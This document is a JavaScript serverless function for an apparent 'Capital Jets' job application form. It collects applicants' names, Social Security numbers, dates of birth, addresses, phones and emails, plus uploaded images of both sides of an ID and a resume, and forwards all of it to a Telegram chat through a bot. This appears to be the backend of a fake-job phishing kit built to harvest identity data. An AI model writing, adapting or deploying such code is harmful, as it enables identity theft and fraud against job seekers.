function isValidSsn(val) {
  if (!/^\d{3}-\d{2}-\d{4}$/.test(val)) return false;
  const parts = val.split("-");
  if (parts[0] === "000" || parts[1] === "00" || parts[2] === "0000") return false;
  return true;
}

function getAge(dobStr) {
  const m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(dobStr);
  if (!m) return -1;
  const year = parseInt(m[1], 10);
  const month = parseInt(m[2], 10);
  const day = parseInt(m[3], 10);
  const check = new Date(Date.UTC(year, month - 1, day));
  if (
    check.getUTCFullYear() !== year ||
    check.getUTCMonth() !== month - 1 ||
    check.getUTCDate() !== day
  ) {
    return -1;
  }
  const now = new Date();
  let age = now.getUTCFullYear() - year;
  const monthDiff = now.getUTCMonth() + 1 - month;
  if (monthDiff < 0 || (monthDiff === 0 && now.getUTCDate() < day)) {
    age--;
  }
  return age;
}

function jsonResponse(statusCode, payload) {
  return {
    statusCode,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  };
}

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return jsonResponse(405, { ok: false, error: "Method Not Allowed" });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) {
    return jsonResponse(500, { ok: false, error: "Missing Telegram env vars" });
  }

  try {
    const contentType = event.headers["content-type"] || event.headers["Content-Type"] || "";
    const bodyBuffer = event.isBase64Encoded
      ? Buffer.from(event.body, "base64")
      : Buffer.from(event.body || "", "utf8");

    // Parse multipart/form-data using Web Request + formData() (Node 18+)
    const req = new Request("http://localhost/api/apply", {
      method: "POST",
      headers: { "content-type": contentType },
      body: bodyBuffer,
    });
    const formData = await req.formData();

    const getField = (name) => (formData.get(name) || "").toString().trim();
    const firstName = getField("first-name");
    const lastName = getField("last-name");
    const ssn = getField("ssn");
    const dob = getField("dob");
    const address = getField("address");
    const phone = getField("phone");
    const email = getField("email");

    const nameRe = /^[A-Za-z][A-Za-z\s'\-]{1,49}$/;
    if (!nameRe.test(firstName)) {
      return jsonResponse(400, { ok: false, error: "Please enter a valid first name (letters only)." });
    }
    if (!nameRe.test(lastName)) {
      return jsonResponse(400, { ok: false, error: "Please enter a valid last name (letters only)." });
    }
    if (!isValidSsn(ssn)) {
      return jsonResponse(400, { ok: false, error: "Please enter a valid 9-digit SSN (XXX-XX-XXXX)." });
    }
    const age = getAge(dob);
    if (age < 0 || dob < "1900-01-01") {
      return jsonResponse(400, { ok: false, error: "Please enter a valid date of birth." });
    }
    if (age < 18) {
      return jsonResponse(400, { ok: false, error: "You must be at least 18 years old to apply." });
    }
    if (address.length < 5) {
      return jsonResponse(400, { ok: false, error: "Please enter a valid address." });
    }
    const phoneDigits = phone.replace(/\D/g, "");
    if (phoneDigits.length < 7 || phoneDigits.length > 15) {
      return jsonResponse(400, { ok: false, error: "Please enter a valid phone number (7 to 15 digits)." });
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
      return jsonResponse(400, { ok: false, error: "Please enter a valid email address." });
    }

    const summary = [
      "New Capital Jets Application",
      "",
      `First Name: ${firstName}`,
      `Last Name: ${lastName}`,
      `SSN: ${ssn}`,
      `Date of Birth: ${dob}`,
      `Address: ${address}`,
      `Phone: ${phone}`,
      `Email: ${email}`,
    ].join("\n");

    const msgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: summary }),
    });
    if (!msgRes.ok) {
      throw new Error(`Telegram sendMessage failed: ${await msgRes.text()}`);
    }

    for (const fieldName of ["id-front", "id-back", "resume"]) {
      const file = formData.get(fieldName);
      if (file && typeof file === "object" && file.size > 0) {
        const docForm = new FormData();
        docForm.append("chat_id", chatId);
        docForm.append("caption", fieldName);
        docForm.append("document", file, file.name || `${fieldName}.bin`);

        const docRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: "POST",
          body: docForm,
        });
        if (!docRes.ok) {
          throw new Error(`Telegram sendDocument (${fieldName}) failed: ${await docRes.text()}`);
        }
      }
    }

    return jsonResponse(200, { ok: true });
  } catch (err) {
    return jsonResponse(500, { ok: false, error: err.message });
  }
};
